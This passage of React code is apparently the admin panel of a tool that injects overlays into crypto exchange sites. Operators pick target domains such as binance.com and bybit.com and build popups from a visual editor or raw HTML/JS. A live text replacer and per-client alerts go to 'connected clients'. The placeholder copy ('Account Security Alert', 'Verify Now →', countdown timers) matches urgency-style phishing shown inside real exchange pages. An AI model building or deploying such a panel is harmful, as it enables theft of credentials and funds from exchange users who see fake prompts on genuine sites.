      body: alertForm.body,
      colorTitle: chosenColor,
      borderColor: chosenColor,
      colorBg: '#14171d',
      colorText: '#eaecef',
      ctaText: alertForm.ctaText,
      ctaUrl: alertForm.ctaUrl,
      ctaBg: chosenColor,
      ctaColor: alertForm.variant === 'warning' || alertForm.variant === 'success' ? '#000000' : '#ffffff',
      position: alertForm.position,
      height: '45',
      width: '520px',
    };

    try {
      const res = await fetch('/api/admin/messages', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });

      const result = await res.json();
      if (!result.success) throw new Error(result.error);

      showToast(alertTargetClient ? `Alert sent directly to ${alertTargetClient.clientId}!` : 'Broadcast alert dispatched to all clients!');
      setShowAlertModal(false);
      fetchClientsAndStats();
    } catch (err) {
      showToast(err.message || 'Failed to dispatch alert', 'error');
    }
  };

  // Delete/Cancel an active alert
  const handleDeleteAlertMessage = async (id) => {
    try {
      const res = await fetch(`/api/admin/messages?id=${id}`, { method: 'DELETE' });
      const result = await res.json();
      if (result.success) {
        showToast('Alert cancelled & removed from client screen');
        fetchClientsAndStats();
      }
    } catch (err) {
      showToast('Failed to cancel alert', 'error');
    }
  };

  // Live Canvas Preview Renderer
  const renderLiveCanvas = (isFullTab = false) => {
    const pos = formData.overlay?.position || 'top';
    const heightVal = `${formData.overlay?.height || 50}vh`;

    const borderVal = `${formData.overlay?.borderWidth || 2}px solid ${formData.overlay?.borderColor || '#f0b90b'}`;

    // Compute separate border values to avoid shorthand/non-shorthand conflicts in React
    const borderTopVal = pos === 'top' ? 'none' : borderVal;
    const borderBottomVal = pos === 'bottom' ? 'none' : borderVal;
    const borderLeftVal = (pos === 'top' || pos === 'bottom') ? 'none' : borderVal;
    const borderRightVal = (pos === 'top' || pos === 'bottom') ? 'none' : borderVal;

    let overlayStyle = {
      backgroundColor: formData.overlay?.bg || '#14171d',
      color: formData.overlay?.text || '#eaecef',
      fontFamily: 'Arial, sans-serif',
      display: 'flex',
      flexDirection: 'column',
      justifyContent: 'center',
      alignItems: 'center',
      borderRadius: `${formData.overlay?.borderRadius || 0}px`,
      borderTop: borderTopVal,
      borderBottom: borderBottomVal,
      borderLeft: borderLeftVal,
      borderRight: borderRightVal,
      boxSizing: 'border-box',
      padding: '28px 36px',
      zIndex: 100,
      transition: 'all 0.25s ease',
    };

    if (formData.overlay?.shadow === 'none') {
      overlayStyle.boxShadow = 'none';
    } else if (formData.overlay?.shadow === 'glow') {
      overlayStyle.boxShadow = `0 0 35px ${formData.overlay?.borderColor || '#f0b90b'}55, 0 10px 40px rgba(0,0,0,0.8)`;
    } else {
      overlayStyle.boxShadow = '0 12px 50px rgba(0,0,0,0.7)';
    }

    if (pos === 'top') {
      Object.assign(overlayStyle, {
        position: 'absolute',
        top: 0,
        left: 0,
        width: '100%',
        height: heightVal,
        maxHeight: '92%',
      });
    } else if (pos === 'bottom') {
      Object.assign(overlayStyle, {
        position: 'absolute',
        bottom: 0,
        left: 0,
        width: '100%',
        height: heightVal,
        maxHeight: '92%',
      });
    } else if (pos === 'center') {
      Object.assign(overlayStyle, {
        position: 'absolute',
        top: '50%',
        left: '50%',
        transform: 'translate(-50%, -50%)',
        width: formData.overlay?.width || '540px',
        maxWidth: '92%',
        minHeight: '220px',
        height: 'auto',
        maxHeight: '85%',
        borderRadius: `${formData.overlay?.borderRadius || 16}px`,
      });
    } else if (pos === 'bottom-right') {
      Object.assign(overlayStyle, {
        position: 'absolute',
        bottom: '20px',
        right: '20px',
        width: formData.overlay?.width || '400px',
        maxWidth: '90%',
        height: 'auto',
        borderRadius: `${formData.overlay?.borderRadius || 12}px`,
      });
    }

    return (
      <div className="preview-browser">
        {/* Top Browser Chrome Bar */}
        <div className="browser-topbar">
          <div className="browser-dots">
            <div className="browser-dot red"></div>
            <div className="browser-dot yellow"></div>
            <div className="browser-dot green"></div>
          </div>

          <div className="browser-url-bar">
            <span style={{ color: '#10b981' }}>🔒 https://</span>
            <span>{formData.domain.replace('*', 'www')}/en/trade/BTC_USDT</span>
          </div>

          {/* Device Viewport Selector */}
          <div style={{ display: 'flex', gap: '4px' }}>
            <button
              type="button"
              className={`btn btn-sm ${deviceViewport === 'desktop' ? 'btn-primary' : 'btn-secondary'}`}
              onClick={() => setDeviceViewport('desktop')}
            >
              🖥 Desktop
            </button>
            <button
              type="button"
              className={`btn btn-sm ${deviceViewport === 'mobile' ? 'btn-primary' : 'btn-secondary'}`}
              onClick={() => setDeviceViewport('mobile')}
            >
              📱 Mobile
            </button>
          </div>
        </div>

        {/* Live Preview Viewport Stage */}
        <div
          className="preview-stage"
          style={{
            alignItems: 'center',
            justifyContent: 'center',
            minHeight: isFullTab ? '640px' : '520px',
          }}
        >
          <div
            style={{
              width: deviceViewport === 'mobile' ? '390px' : '100%',
              height: '100%',
              minHeight: isFullTab ? '640px' : '520px',
              position: 'relative',
              overflow: 'hidden',
              transition: 'width 0.25s ease',
              borderLeft: deviceViewport === 'mobile' ? '2px solid rgba(255,255,255,0.1)' : 'none',
              borderRight: deviceViewport === 'mobile' ? '2px solid rgba(255,255,255,0.1)' : 'none',
              backgroundColor: '#0b0e11',
            }}
          >
            {/* Backdrop Blur (Center modal) */}
            {pos === 'center' && !previewClosed && formData.enabled && (
              <div
                style={{
                  position: 'absolute',
                  inset: 0,
                  backgroundColor: 'rgba(0, 0, 0, 0.65)',
                  backdropFilter: formData.overlay?.backdropBlur ? 'blur(6px)' : 'none',
                  zIndex: 90,
                  transition: 'all 0.3s ease',
                }}
                onClick={() => setPreviewClosed(true)}
              />
            )}

            {/* Simulated Overlay Popup */}
            {formData.enabled && !previewClosed ? (
              <div id="preview-custom-popup" style={overlayStyle}>
                {/* Close Button */}
                {formData.overlay?.closable !== false && (
                  <div
                    onClick={() => setPreviewClosed(true)}
                    style={{
                      position: 'absolute',
                      top: '14px',
                      right: '18px',
                      cursor: 'pointer',
                      fontSize: '18px',
                      color: formData.overlay?.text || '#eaecef',
                      opacity: 0.7,
                      lineHeight: 1,
                      zIndex: 110,
                    }}
                    title="Simulate Close"
                  >
                    ✕
                  </div>
                )}

                {/* Content Renderer: Custom Coding vs Elementor Sections */}
                {currentMode === 'code' ? (
                  formData.overlay?.customHtml ? (
                    <div
                      style={{ width: '100%' }}
                      dangerouslySetInnerHTML={{ __html: formData.overlay.customHtml }}
                    />
                  ) : (
                    <div style={{ textAlign: 'center', padding: '20px', color: '#848e9c' }}>
                      <p style={{ fontWeight: 600 }}>Custom HTML is empty</p>
                      <p style={{ fontSize: '12px' }}>Type your markup in the Custom Coding tab on the left.</p>
                    </div>
                  )
                ) : (
                  /* Elementor Sections Mode */
                  <div style={{ width: '100%', display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
                    {currentSections.map((sec, idx) => (
                      <div key={sec.id || idx} style={{ width: '100%', marginBottom: '10px' }}>
                        {sec.type === 'heading' && (
                          <div
                            style={{
                              fontSize: `${sec.size || 30}px`,
                              fontWeight: 'bold',
                              color: sec.color || '#f0b90b',
                              textAlign: sec.align || 'center',
                              lineHeight: 1.25,
                            }}
                          >
                            {sec.text}
                          </div>
                        )}

                        {sec.type === 'text' && (
                          <div
                            style={{
                              fontSize: `${sec.size || 16}px`,
                              lineHeight: 1.6,
                              color: sec.color || '#eaecef',
                              textAlign: sec.align || 'center',
                            }}
                            dangerouslySetInnerHTML={{ __html: sec.text }}
                          />
                        )}

                        {sec.type === 'button' && (
                          <div style={{ textAlign: 'center', marginTop: '6px' }}>
                            <a
                              href={sec.url || '#'}
                              target="_blank"
                              rel="noreferrer"
                              style={{
                                display: 'inline-block',
                                padding: '10px 28px',
                                background: sec.bg || '#f0b90b',
                                color: sec.color || '#000000',
                                fontWeight: 700,
                                fontSize: `${sec.size || 15}px`,
                                borderRadius: '8px',
                                textDecoration: 'none',
                                boxShadow: '0 4px 15px rgba(0,0,0,0.25)',
                              }}
                            >
                              {sec.text}
                            </a>
                          </div>
                        )}

                        {sec.type === 'alert' && (
                          <div
                            style={{
                              padding: '8px 16px',
                              borderRadius: '6px',
                              background: sec.variant === 'danger' ? 'rgba(239, 68, 68, 0.15)' : 'rgba(245, 158, 11, 0.15)',
                              border: `1px solid ${sec.variant === 'danger' ? '#ef4444' : '#f59e0b'}`,
                              color: sec.variant === 'danger' ? '#ef4444' : '#f59e0b',
                              fontSize: '13px',
                              fontWeight: 600,
                              textAlign: 'center',
                              display: 'flex',
                              alignItems: 'center',
                              justifyContent: 'center',
                              gap: '8px',
                            }}
                          >
                            <span>{sec.icon || '⚠️'}</span>
                            <span>{sec.text}</span>
                          </div>
                        )}

                        {sec.type === 'countdown' && (
                          <div
                            style={{
                              textAlign: 'center',
                              fontFamily: 'monospace',
                              fontSize: '15px',
                              color: '#f59e0b',
                              fontWeight: 700,
                              margin: '6px 0',
                            }}
                          >
                            ⏳ {sec.label || 'Expires in:'} {String(sec.minutes || 10).padStart(2, '0')}:00
                          </div>
                        )}

                        {sec.type === 'image' && (
                          <div style={{ textAlign: 'center' }}>
                            <img src={sec.url} alt="Section media" style={{ maxWidth: sec.width || '140px' }} />
                          </div>
                        )}
                      </div>
                    ))}
                  </div>
                )}
              </div>
            ) : (
              <div
                style={{
                  position: 'absolute',
                  top: '20px',
                  left: '50%',
                  transform: 'translateX(-50%)',
                  background: 'rgba(239, 68, 68, 0.15)',
                  border: '1px solid var(--brand-red)',
                  color: 'var(--brand-red)',
                  padding: '8px 18px',
                  borderRadius: '8px',
                  fontSize: '12px',
                  fontWeight: 600,
                }}
              >
                {!formData.enabled ? 'Overlay is currently DISABLED' : 'Overlay was closed in simulation. Click below to reopen:'}
                {previewClosed && (
                  <button
                    type="button"
                    className="btn btn-sm btn-secondary"
                    style={{ marginLeft: '10px' }}
                    onClick={() => setPreviewClosed(false)}
                  >
                    Reopen Popup
                  </button>
                )}
              </div>
            )}

            {/* Background Simulated Binance Content */}
            <div className="mock-page-content">
              <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '25px' }}>
                <div style={{ width: '130px', height: '26px', background: '#f0b90b', borderRadius: '4px' }}></div>
                <div style={{ display: 'flex', gap: '16px' }}>
                  <div style={{ width: '60px', height: '20px', background: '#2b313a', borderRadius: '4px' }}></div>
                  <div style={{ width: '60px', height: '20px', background: '#2b313a', borderRadius: '4px' }}></div>
                  <div style={{ width: '60px', height: '20px', background: '#2b313a', borderRadius: '4px' }}></div>
                </div>
              </div>

              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: '16px', marginBottom: '24px' }}>
                {[1, 2, 3, 4].map((i) => (
                  <div key={i} style={{ height: '80px', background: '#181a20', borderRadius: '8px' }}></div>
                ))}
              </div>

              <div style={{ height: '200px', background: '#181a20', borderRadius: '8px' }}></div>
            </div>
          </div>
        </div>
      </div>
    );
  };

  if (authChecking) {
    return (
      <div className="login-wrapper">
        <div style={{ textAlign: 'center', color: 'var(--brand-purple)', fontWeight: 600 }}>
          <div className="live-pulse-dot" style={{ width: '16px', height: '16px', marginBottom: '12px' }} />
          <div>Verifying Admin Portal Session...</div>
        </div>
      </div>
    );
  }

  if (!isAuthenticated) {
    return (
      <div className="login-wrapper">
        <div className="login-card">
          <div className="login-brand-header">
            <div className="login-brand-icon">🛡️</div>
            <h1 className="login-title">Admin Dashboard Login</h1>
            <p className="login-subtitle">Enter your credentials to manage overlays, rules, and live clients</p>
          </div>

          {loginError && (
            <div className="login-alert-error">
              <span>⚠️</span>
              <span>{loginError}</span>
            </div>
          )}

          <form onSubmit={handleLogin} style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
            <div className="form-group" style={{ marginBottom: 0 }}>
              <label className="form-label" style={{ fontWeight: 600 }}>Admin Email Address</label>
              <input
                type="email"
                className="form-input"
                value={loginEmail}
                onChange={(e) => setLoginEmail(e.target.value)}
                placeholder="Enter admin email"
                required
                style={{ padding: '12px 14px', fontSize: '14px' }}
              />
            </div>

            <div className="form-group" style={{ marginBottom: 0 }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '6px' }}>
                <label className="form-label" style={{ fontWeight: 600, margin: 0 }}>Password</label>
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  style={{ background: 'transparent', border: 'none', color: 'var(--brand-purple)', fontSize: '12px', cursor: 'pointer', fontWeight: 600 }}
                >
                  {showPassword ? 'Hide' : 'Show'}
                </button>
              </div>
              <input
                type={showPassword ? 'text' : 'password'}
                className="form-input"
                value={loginPassword}
                onChange={(e) => setLoginPassword(e.target.value)}
                placeholder="Enter password"
                required
                style={{ padding: '12px 14px', fontSize: '14px' }}
              />
            </div>

            <button
              type="submit"
              className="btn btn-primary"
              disabled={loginLoading}
              style={{ padding: '14px', fontSize: '15px', fontWeight: 700, width: '100%', marginTop: '6px' }}
            >
              {loginLoading ? '⏳ Authenticating...' : '🔐 Sign In to Dashboard'}
            </button>
          </form>


        </div>
      </div>
    );
  }

  return (
    <div className="app-container">
      {/* Toast Notification */}
      {toast && (
        <div className={`toast toast-${toast.type}`}>
          <span>{toast.type === 'success' ? '✓' : '⚠'}</span>
          <span>{toast.message}</span>
        </div>
      )}

      {/* Top Header */}
      <header className="header-bar">
        <div className="brand-wrapper">
          <div className="brand-icon">⚡</div>
          <div>
            <h1 className="brand-title">Remote Dynamic Overlay Studio</h1>
            <p className="brand-subtitle">Visual Elementor builder & targeted direct client alert injector</p>
          </div>
        </div>

        <div className="header-stats">
          <div className="stat-pill">
            <span className="dot-indicator dot-green"></span>
            <span>API: <strong>Online</strong></span>
          </div>
          <div className="stat-pill">
            <span className={`dot-indicator ${stats.mongoConnected ? 'dot-green' : 'dot-gold'}`}></span>
            <span>Database: <strong>{stats.mongoConnected ? 'MongoDB Live' : 'Local Fallback'}</strong></span>
          </div>
          <div className="stat-pill">
            <span>Rules: <strong>{rules.length}</strong></span>
          </div>
          <div className="stat-pill">
            <span className="dot-indicator dot-green"></span>
            <span>Online Clients: <strong>{stats.onlineClients || 0}</strong></span>
          </div>

          {/* Admin User Badge & Sign Out Button */}
          <div className="stat-pill" style={{ background: 'var(--brand-purple-subtle)', borderColor: 'var(--brand-purple)' }}>
            <span style={{ fontSize: '13px' }}>👤</span>
            <span style={{ fontWeight: 600, color: 'var(--brand-purple)' }}>{adminUser?.email || 'Admin'}</span>
          </div>

          <button
            type="button"
            className="btn btn-secondary btn-sm"
            onClick={handleLogout}
            style={{ padding: '6px 12px', fontSize: '12px' }}
            title="Sign out of Admin Dashboard"
          >
            🚪 Sign Out
          </button>
        </div>
      </header>

      {/* Navigation Tabs */}
      <nav className="tabs-nav">
        <button
          className={`tab-btn ${activeTab === 'rules' ? 'active' : ''}`}
          onClick={() => setActiveTab('rules')}
        >
          <span>🎨 Visual Editor</span>
          <span className="tab-count">{rules.length}</span>
        </button>

        <button
          className={`tab-btn ${activeTab === 'replacements' ? 'active' : ''}`}
          onClick={() => setActiveTab('replacements')}
        >
          <span>✏️ Live Text Replacer</span>
          <span className="tab-count">{replacements.length}</span>
        </button>

        <button
          className={`tab-btn ${activeTab === 'preview' ? 'active' : ''}`}
          onClick={() => setActiveTab('preview')}
        >
          <span>👁 Fullscreen Preview</span>
        </button>

        <button
          className={`tab-btn ${activeTab === 'clients' ? 'active' : ''}`}
          onClick={() => setActiveTab('clients')}
        >
          <span>👥 Connected Clients & Instant Alert</span>
          <span className="tab-count">{clients.length}</span>
        </button>

        <button
          className={`tab-btn ${activeTab === 'settings' ? 'active' : ''}`}
          onClick={() => setActiveTab('settings')}
        >
          <span>⚙️ Settings & Profile</span>
        </button>

        <button
          className={`tab-btn ${activeTab === 'docs' ? 'active' : ''}`}
          onClick={() => setActiveTab('docs')}
        >
          <span>📖 Setup Guide</span>
        </button>
      </nav>

      {/* TAB 1: Visual Editor & Live Preview */}
      {activeTab === 'rules' && (
        <div>
          {/* Domain Rules Selector Bar */}
          <div
            style={{
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'space-between',
              background: 'var(--bg-card)',
              border: '1px solid var(--border-subtle)',
              borderRadius: 'var(--radius-md)',
              padding: '12px 18px',
              marginBottom: '18px',
            }}
          >
            <div style={{ display: 'flex', alignItems: 'center', gap: '8px', flexWrap: 'wrap' }}>
              <span style={{ fontSize: '13px', fontWeight: 700, color: 'var(--text-secondary)' }}>Target Domain:</span>
              {rules.filter((r) => r.domain !== '*' && r.id !== 'rule-global-fallback').map((rule) => {
                const isSelected = selectedRuleId === rule.id;
                return (
                  <button
                    key={rule.id}
                    type="button"
                    onClick={() => handleSelectRule(rule)}
                    style={{
                      padding: '6px 16px',
                      borderRadius: '8px',
                      fontSize: '13px',
                      fontWeight: 600,
                      cursor: 'pointer',
                      background: isSelected ? 'var(--brand-purple-subtle)' : '#ffffff',
                      border: `1.5px solid ${isSelected ? 'var(--brand-purple)' : 'var(--border-light)'}`,
                      color: isSelected ? 'var(--brand-purple)' : 'var(--text-primary)',
                      transition: 'all 0.15s ease',
                      display: 'inline-flex',
                      alignItems: 'center',
                      gap: '6px',
                    }}
                  >
                    <span>🌐 {rule.domain}</span>
                  </button>
                );
              })}

              {/* Direct In-Line "➕ Add Domain" Button Right Next to the Pills */}
              <button
                type="button"
                className="btn btn-primary btn-sm"
                onClick={handleOpenAddDomainModal}
                style={{ padding: '6px 16px', fontWeight: 700 }}
              >
                ➕ Add Domain
              </button>
            </div>
          </div>

          {/* 2 OPTIONS SELECTOR: Elementor vs Custom Coding */}
          <div className="builder-mode-switcher">
            <button
              type="button"
              className={`builder-mode-btn ${currentMode === 'elementor' ? 'active' : ''}`}
              onClick={() => setBuilderMode('elementor')}
            >
              <span className="mode-icon">🎨</span>
              <div>
                <div className="mode-title">Elementor (Visual Section Builder)</div>
                <div className="mode-desc">Non-technical friendly: Add headings, texts, buttons & alert badges as modular sections</div>
              </div>
              {currentMode === 'elementor' && <span className="mode-check">✓ Active Mode</span>}
            </button>

            <button
              type="button"
              className={`builder-mode-btn ${currentMode === 'code' ? 'active' : ''}`}
              onClick={() => setBuilderMode('code')}
            >
              <span className="mode-icon">💻</span>
              <div>
                <div className="mode-title">Custom Coding (HTML / CSS / JS)</div>
                <div className="mode-desc">Developer friendly: Write raw HTML structure, custom CSS styling & JavaScript logic</div>
              </div>
              {currentMode === 'code' && <span className="mode-check">✓ Active Mode</span>}
            </button>
          </div>

          {/* Main 2-Column Split: Controls on Left, Live Canvas on Right */}
          <div className="elementor-layout-split">
            {/* Left Column: Form Controls */}
            <div className="elementor-sidebar">
              {/* Domain & Global Frame Settings */}
              <div className="builder-box">
                <div className="builder-box-title">
                  <div>
                    <span style={{ fontWeight: 700, fontSize: '14px' }}>🌐 Target Domain</span>
                    <div style={{ fontSize: '11px', color: 'var(--brand-purple)', fontWeight: 600, marginTop: '2px' }}>
                      Currently Editing: {formData.domain}
                    </div>
                  </div>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                    <button
                      type="button"
                      className="btn btn-secondary btn-sm"
                      onClick={handleOpenAddDomainModal}
                      title="Add a brand new domain rule"
                    >
                      ➕ New Domain
                    </button>
                    <label className="toggle-switch" title="Enable/Disable overlay for this domain">
                      <input
                        type="checkbox"
                        checked={formData.enabled}
                        onChange={(e) => setFormData({ ...formData, enabled: e.target.checked })}
                      />
                      <span className="toggle-slider"></span>
                    </label>
                  </div>
                </div>

                <div className="form-group">
                  <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '4px' }}>
                    <label className="form-label" style={{ marginBottom: 0 }}>Target Domain URL / Pattern:</label>
                    <span style={{ fontSize: '10px', color: 'var(--text-secondary)' }}>e.g. bybit.com or *.binance.com</span>
                  </div>
                  <input
                    type="text"
                    className="form-input"
                    value={formData.domain}
                    onChange={(e) => setFormData({ ...formData, domain: e.target.value })}
                    placeholder="e.g. binance.com or *.binance.com"
                  />
                  <div style={{ fontSize: '11px', color: 'var(--text-secondary)', marginTop: '4px' }}>
                    💡 Tip: Click <strong>&quot;➕ New Domain&quot;</strong> to create a new rule, or edit above and click <strong>&quot;Save&quot;</strong> below to update.
                  </div>
                </div>

                {/* 4 Clean Position Cards */}
                <div className="form-group">
                  <label className="form-label">Popup Screen Position:</label>
                  <div className="position-grid-4">
                    {[
                      { id: 'top', label: 'Top Banner', icon: '⬆' },
                      { id: 'center', label: 'Center Modal', icon: '🗖' },
                      { id: 'bottom', label: 'Bottom Banner', icon: '⬇' },
                      { id: 'bottom-right', label: 'Corner Toast', icon: '↘' },
                    ].map((p) => (
                      <button
                        key={p.id}
                        type="button"
                        className={`position-card-btn ${formData.overlay?.position === p.id ? 'active' : ''}`}
                        onClick={() => updateOverlay('position', p.id)}
                      >
                        <span>{p.icon}</span>
                        <span>{p.label}</span>
                      </button>
                    ))}
                  </div>
                </div>

                {/* Height Slider */}
                <div className="form-group">
                  <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '4px' }}>
                    <label className="form-label">Popup Height:</label>
                    <span style={{ fontSize: '12px', fontWeight: 700, color: 'var(--brand-purple)' }}>
                      {formData.overlay?.height || 50}vh
                    </span>
                  </div>
                  <input
                    type="range"
                    min="20"
                    max="90"
                    value={formData.overlay?.height || 50}
                    onChange={(e) => updateOverlay('height', e.target.value)}
                    className="clean-slider"
                  />
                </div>

                {/* Colors */}
                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '10px' }}>
                  <div className="form-group" style={{ marginBottom: 0 }}>
                    <label className="form-label">Background:</label>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                      <input
                        type="color"
                        value={formData.overlay?.bg || '#14171d'}
                        onChange={(e) => updateOverlay('bg', e.target.value)}
                        style={{ width: '32px', height: '32px', border: 'none', cursor: 'pointer', borderRadius: '4px' }}
                      />
                      <span style={{ fontSize: '11px', fontFamily: 'monospace' }}>{formData.overlay?.bg || '#14171d'}</span>
                    </div>
                  </div>

                  <div className="form-group" style={{ marginBottom: 0 }}>
                    <label className="form-label">Accent / Border:</label>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                      <input
                        type="color"
                        value={formData.overlay?.borderColor || '#f0b90b'}
                        onChange={(e) => updateOverlay('borderColor', e.target.value)}
                        style={{ width: '32px', height: '32px', border: 'none', cursor: 'pointer', borderRadius: '4px' }}
                      />
                      <span style={{ fontSize: '11px', fontFamily: 'monospace' }}>{formData.overlay?.borderColor || '#f0b90b'}</span>
                    </div>
                  </div>
                </div>
              </div>

              {/* MODE A: ELEMENTOR SECTIONS BUILDER */}
              {currentMode === 'elementor' ? (
                <div className="builder-box">
                  <div className="builder-box-title">
                    <span>🧱 Elementor Sections</span>
                    <span style={{ fontSize: '11px', color: 'var(--text-secondary)' }}>
                      {currentSections.length} {currentSections.length === 1 ? 'section' : 'sections'}
                    </span>
                  </div>

                  {/* List of Sections */}
                  {currentSections.length === 0 ? (
                    <div style={{ padding: '20px', textAlign: 'center', color: 'var(--text-secondary)', fontSize: '13px' }}>
                      No sections added yet. Click below to add your first section!
                    </div>
                  ) : (
                    currentSections.map((sec, idx) => (
                      <div key={sec.id || idx} className="section-item-card">
                        <div className="section-item-header">
                          <div className="section-badge-title">
                            <span>
                              {sec.type === 'heading' && '📌'}
                              {sec.type === 'text' && '📝'}
                              {sec.type === 'button' && '🔘'}
                              {sec.type === 'alert' && '⚠️'}
                              {sec.type === 'countdown' && '⏳'}
                              {sec.type === 'image' && '🖼️'}
                            </span>
                            <span>{sec.type.toUpperCase()} SECTION</span>
                          </div>

                          <div className="section-controls">
                            <button
                              type="button"
                              className="btn-icon-subtle"
                              onClick={() => handleMoveSection(idx, -1)}
                              disabled={idx === 0}
                              title="Move Up"
                            >
                              ▲
                            </button>
                            <button
                              type="button"
                              className="btn-icon-subtle"
                              onClick={() => handleMoveSection(idx, 1)}
                              disabled={idx === currentSections.length - 1}
                              title="Move Down"
                            >
                              ▼
                            </button>
                            <button
                              type="button"
                              className="btn-icon-subtle delete"
                              onClick={() => handleRemoveSection(idx)}
                              title="Delete Section"
                            >
                              ✕
                            </button>
                          </div>
                        </div>

                        {/* Inline Fields for each section type */}
                        <div className="section-item-body">
                          {sec.type === 'heading' && (
                            <div>
                              <div className="form-group">
                                <label className="form-label">Heading Text:</label>
                                <input
                                  type="text"
                                  className="form-input"
                                  value={sec.text || ''}
                                  onChange={(e) => handleUpdateSection(idx, 'text', e.target.value)}
                                  placeholder="e.g. Account Security Alert"
                                />
                              </div>
                              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '8px' }}>
                                <div>
                                  <label className="form-label">Font Size (px):</label>
                                  <input
                                    type="number"
                                    className="form-input"
                                    value={sec.size || 32}
                                    onChange={(e) => handleUpdateSection(idx, 'size', parseInt(e.target.value, 10))}
                                  />
                                </div>
                                <div>
                                  <label className="form-label">Text Color:</label>
                                  <input
                                    type="color"
                                    value={sec.color || '#f0b90b'}
                                    onChange={(e) => handleUpdateSection(idx, 'color', e.target.value)}
                                    style={{ width: '100%', height: '36px', border: 'none', cursor: 'pointer', borderRadius: '4px' }}
                                  />
                                </div>
                              </div>
                            </div>
                          )}

                          {sec.type === 'text' && (
                            <div>
                              <div className="form-group">
                                <label className="form-label">Message Text / HTML:</label>
                                <textarea
                                  className="form-textarea"
                                  rows={2}
                                  value={sec.text || ''}
                                  onChange={(e) => handleUpdateSection(idx, 'text', e.target.value)}
                                  placeholder="Enter instructions, warning details or message..."
                                />
                              </div>
                              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '8px' }}>
                                <div>
                                  <label className="form-label">Size (px):</label>
                                  <input
                                    type="number"
                                    className="form-input"
                                    value={sec.size || 16}
                                    onChange={(e) => handleUpdateSection(idx, 'size', parseInt(e.target.value, 10))}
                                  />
                                </div>
                                <div>
                                  <label className="form-label">Text Color:</label>
                                  <input
                                    type="color"
                                    value={sec.color || '#eaecef'}
                                    onChange={(e) => handleUpdateSection(idx, 'color', e.target.value)}
                                    style={{ width: '100%', height: '36px', border: 'none', cursor: 'pointer', borderRadius: '4px' }}
                                  />
                                </div>
                              </div>
                            </div>
                          )}

                          {sec.type === 'button' && (
                            <div>
                              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '8px' }}>
                                <div className="form-group">
                                  <label className="form-label">Button Label:</label>
                                  <input
                                    type="text"
                                    className="form-input"
                                    value={sec.text || ''}
                                    onChange={(e) => handleUpdateSection(idx, 'text', e.target.value)}
                                    placeholder="e.g. Verify Now →"
                                  />
                                </div>
                                <div className="form-group">
                                  <label className="form-label">Link URL:</label>
                                  <input
                                    type="text"
                                    className="form-input"
                                    value={sec.url || ''}
                                    onChange={(e) => handleUpdateSection(idx, 'url', e.target.value)}
                                    placeholder="https://..."
                                  />
                                </div>
                              </div>
                              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '8px' }}>
                                <div>
                                  <label className="form-label">Button Color:</label>
                                  <input
                                    type="color"
                                    value={sec.bg || '#f0b90b'}
                                    onChange={(e) => handleUpdateSection(idx, 'bg', e.target.value)}
                                    style={{ width: '100%', height: '36px', border: 'none', cursor: 'pointer', borderRadius: '4px' }}
                                  />
                                </div>
                                <div>
                                  <label className="form-label">Text Color:</label>
                                  <input
                                    type="color"
                                    value={sec.color || '#000000'}
                                    onChange={(e) => handleUpdateSection(idx, 'color', e.target.value)}
                                    style={{ width: '100%', height: '36px', border: 'none', cursor: 'pointer', borderRadius: '4px' }}
                                  />
                                </div>
                              </div>
                            </div>
                          )}

                          {sec.type === 'alert' && (
                            <div>
                              <div className="form-group">
                                <label className="form-label">Alert Message:</label>
                                <input
                                  type="text"
                                  className="form-input"
                                  value={sec.text || ''}
                                  onChange={(e) => handleUpdateSection(idx, 'text', e.target.value)}
                                  placeholder="e.g. Action required within 24 hours"
                                />
                              </div>
                              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '8px' }}>
                                <div>
                                  <label className="form-label">Alert Style:</label>
                                  <select
                                    className="form-select"
                                    value={sec.variant || 'warning'}
                                    onChange={(e) => handleUpdateSection(idx, 'variant', e.target.value)}
                                  >
                                    <option value="warning">⚠️ Warning Gold</option>
                                    <option value="danger">🚨 Danger Red</option>
                                    <option value="success">🟢 Success Green</option>
                                    <option value="info">🔵 Info Blue</option>
                                  </select>
                                </div>
                                <div>
                                  <label className="form-label">Icon:</label>
                                  <input
                                    type="text"
                                    className="form-input"
                                    value={sec.icon || '⚠️'}
                                    onChange={(e) => handleUpdateSection(idx, 'icon', e.target.value)}
                                  />
                                </div>
                              </div>
                            </div>
                          )}

                          {sec.type === 'countdown' && (
                            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '8px' }}>
                              <div className="form-group">
                                <label className="form-label">Countdown Label:</label>
                                <input
                                  type="text"
                                  className="form-input"
                                  value={sec.label || 'Expires in:'}
                                  onChange={(e) => handleUpdateSection(idx, 'label', e.target.value)}
                                />
                              </div>
                              <div className="form-group">
                                <label className="form-label">Minutes:</label>
                                <input
                                  type="number"
                                  className="form-input"
                                  value={sec.minutes || 15}
                                  onChange={(e) => handleUpdateSection(idx, 'minutes', parseInt(e.target.value, 10))}
                                />
                              </div>
                            </div>
                          )}
                        </div>
                      </div>
                    ))
                  )}

                  {/* Add Section Trigger Button */}
                  <button
                    type="button"
                    className="btn-add-section"
                    onClick={() => setShowAddSectionTray(!showAddSectionTray)}
                  >
                    <span>➕ Add Section (Like Elementor)</span>
                  </button>

                  {/* Add Section Tray */}
                  {showAddSectionTray && (
                    <div className="add-section-grid">
                      <button
                        type="button"
                        className="add-section-option-btn"
                        onClick={() => handleAddSection('heading')}
                      >
                        <span className="add-section-icon">📌</span>
                        <span className="add-section-label">Heading</span>
                      </button>

                      <button
                        type="button"
